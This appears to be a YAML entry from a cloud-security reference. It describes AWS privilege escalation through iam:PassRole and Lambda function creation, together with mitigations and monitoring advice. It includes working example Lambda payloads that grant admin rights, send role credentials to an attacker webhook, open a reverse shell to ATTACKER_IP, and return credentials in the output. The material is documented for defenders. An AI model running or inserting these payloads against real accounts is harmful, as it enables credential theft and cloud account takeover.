description: A principal with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction`
  can create a new Lambda function and attach an existing IAM Role to it. When the
  function is invoked, the code executes with the permissions of the attached role.
  The level of access gained depends on the permissions of the available roles.
prerequisites:
  admin:
  - A role must exist that trusts lambda.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess)
  lateral:
  - A role must exist that trusts lambda.amazonaws.com to assume it

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative service roles** - Very rarely does a Lambda function need administrative access. Use the principle of least privilege.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificLambdaRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "lambda.amazonaws.com"
      }
    }
  }
  ```


  - Monitor CloudTrail for unusual Lambda function creation followed by immediate invocation
  - Monitor CloudTrail for Lambda function creation by principals who do not usually create functions
  - Monitor CloudTrail for roles being passed to Lambda that haven't been used before
  - Monitor and alert on Lambda function creation with privileged roles
  - Regularly audit Lambda functions for excessive IAM permissions
  - Regularly audit all IAM roles that trust the Lambda service and down-scope any roles with administrative access
limitations: 'This path provides administrative access only if the passed role has
  administrative permissions (e.g., AdministratorAccess or an equivalent custom policy).
  If only limited roles are available, you gain access limited to those permissions.
  However, even limited access may enable multi-hop attacks or access to sensitive
  data.

  - id: method_sdk_attack
    label: 'Method 1: Execute Attack via AWS SDK'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function code uses the AWS SDK to directly perform privileged actions using the target role's credentials. The function can call IAM APIs to elevate the starting principal's permissions, create access keys, modify policies, or perform other administrative actions. Since the function runs with the target role's credentials automatically available, no credential exfiltration is needed.

      Example malicious Lambda code:
      ```python
      import boto3

      def lambda_handler(event, context):
          iam = boto3.client('iam')
          # Attach admin policy to starting user
          iam.attach_user_policy(
              UserName='attacker-user',
              PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
          )
          return {'statusCode': 200, 'body': 'Privilege escalation complete'}
      ```

      This is the most direct approach - the Lambda function immediately modifies IAM or performs other privileged actions using the target role's permissions.
  - id: method_webhook_exfil
    label: 'Method 2: Exfiltrate Credentials to Webhook'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function code retrieves the target role's temporary credentials from the Lambda environment and exfiltrates them to an attacker-controlled webhook or HTTP endpoint. The credentials are automatically available in environment variables that the AWS SDK uses.

      Example malicious Lambda code:
      ```python
      import os
      import json
      import urllib.request

      def lambda_handler(event, context):
          # Get credentials from environment
          creds = {
              'access_key': os.environ['AWS_ACCESS_KEY_ID'],
              'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
              'session_token': os.environ['AWS_SESSION_TOKEN']
          }

          # Exfiltrate to webhook
          req = urllib.request.Request(
              'https://attacker-webhook.com/collect',
              data=json.dumps(creds).encode(),
              headers={'Content-Type': 'application/json'}
          )
          urllib.request.urlopen(req)

          return {'statusCode': 200}
      ```

      The attacker receives the credentials remotely and can use them from any location until they expire (typically 15 minutes to 1 hour).
  - id: method_reverse_shell
    label: 'Method 3: Reverse Shell Connection'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function establishes a reverse shell connection back to an attacker-controlled listener, providing interactive access. From within the reverse shell, the attacker can access the target role's credentials and run arbitrary AWS CLI commands.

      Example malicious Lambda code:
      ```python
      import socket
      import subprocess
      import os

      def lambda_handler(event, context):
          # Establish reverse shell
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect(('ATTACKER_IP', 4444))

          # Redirect stdin/stdout/stderr to socket
          os.dup2(s.fileno(), 0)
          os.dup2(s.fileno(), 1)
          os.dup2(s.fileno(), 2)

          # Start shell
          subprocess.call(['/bin/sh', '-i'])

          return {'statusCode': 200}
      ```

      This provides an interactive shell session within the Lambda execution environment where the attacker can access credentials and execute AWS CLI commands with the target role's permissions. The session lasts until the Lambda function times out (max 15 minutes).
  - id: method_output_exfil
    label: 'Method 4: Exfiltrate Credentials to Output'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function code retrieves the execution role's temporary credentials from the Lambda environment and returns them in the function's response output. This allows the attacker to read the credentials directly from the Lambda invocation result without needing an external webhook or reverse shell.

      Example malicious Lambda code:
      ```python
      import os
      import json

      def lambda_handler(event, context):
          # Get credentials from environment
          creds = {
              'access_key': os.environ['AWS_ACCESS_KEY_ID'],
              'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
              'session_token': os.environ['AWS_SESSION_TOKEN']
          }

          # Return credentials in the response
          return {
              'statusCode': 200,
              'body': json.dumps({
                  'message': 'Credentials exfiltrated',
                  'credentials': creds
              })
          }
      ```

      The attacker invokes the function and reads the credentials from the response output. These credentials can then be exported and used from any location until they expire (typically 15 minutes to 1 hour).
